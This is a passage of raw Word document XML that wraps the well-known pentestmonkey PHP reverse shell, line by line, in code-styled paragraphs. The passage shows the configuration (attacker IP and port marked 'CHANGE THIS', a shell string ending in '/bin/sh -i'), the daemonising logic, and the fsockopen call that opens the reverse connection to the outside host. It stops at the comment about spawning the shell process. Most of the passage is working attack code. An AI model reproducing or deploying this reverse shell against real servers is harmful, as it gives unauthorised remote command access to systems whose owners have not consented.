    <w:p w14:paraId="44134D8B" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3392A4A4" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BC2E493" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EC78956" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// Usage</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67EC68FA" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// -----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73843C9F" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33169EFE" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05DE3A3D" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>set_time_limit (0);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="396CDFF9" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>$VERSION = "1.0";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20D91492" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>$ip = '192.168.1.254';  // CHANGE THIS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42F6F8F5" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>$port = 1234;       // CHANGE THIS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17B9B9A1" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>$chunk_size = 1400;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B131B2C" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>$write_a = null;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37063DFA" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>$error_a = null;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0584753E" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>$shell = 'uname -a; w; id; /bin/sh -i';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="459281B2" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>$daemon = 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20867005" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>$debug = 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="608427F0" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48FCFDE6" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CA546FC" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// Daemonise ourself if possible to avoid zombies later</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BA0F0A3" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="483C74CE" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5259E9A3" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// pcntl_fork is hardly ever available, but will allow us to daemonise</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E64F425" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// our php process and avoid zombies.  Worth a try...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61F718CA" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>if (function_exists('pcntl_fork')) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F7EE60E" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>// Fork and have the parent process exit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="224C9DC6" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>$pid = pcntl_fork();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="704D83FA" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="68CCFFDC" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>if ($pid == -1) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B808672" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>printit("ERROR: Can't fork");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CB28FFE" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>exit(1);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="594ACF2D" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25FACB43" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2154A1FB" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>if ($pid) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46D6EF74" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>exit(0);  // Parent exits</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EAD03BE" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E755842" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46C79359" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>// Make the current process a session leader</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="716CA016" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>// Will only succeed if we forked</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F465544" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>if (posix_setsid() == -1) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7841F37B" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>printit("Error: Can't setsid()");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1526B78A" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>exit(1);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="095BD45F" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22EEEC92" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="42F66F63" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>$daemon = 1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="031BF459" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>} else {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6279A377" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F8101B8" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="432BD97E" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0443951D" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// Change to a safe directory</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FBC20F3" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>chdir("/");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F48D295" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07C382D6" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// Remove any umask we inherited</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="727F0403" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>umask(0);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DC9D0BE" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1259C0FF" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="184DC46A" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// Do the reverse shell...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A74DECF" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7094B643" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14212D57" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// Open reverse connection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57D525F7" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>$sock = fsockopen($ip, $port, $errno, $errstr, 30);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="271E59E3" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>if (!$sock) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="526B152F" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>printit("$errstr ($errno)");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71187CFE" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>exit(1);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53802312" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75CE3AAF" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03AE40EA" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// Spawn shell process</w:t>
